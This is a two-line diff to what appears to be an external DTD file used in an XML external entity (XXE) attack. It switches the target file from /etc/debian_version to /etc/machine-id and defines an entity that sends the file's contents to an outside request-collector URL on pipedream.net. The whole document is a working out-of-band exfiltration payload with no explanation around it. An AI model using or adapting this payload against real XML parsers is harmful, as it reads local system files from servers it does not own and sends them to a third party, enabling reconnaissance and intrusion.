@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/debian_version">
+<!ENTITY % file SYSTEM "file:///etc/machine-id">
 <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enzcf2cxlhdt.x.pipedream.net/?%file;'>">
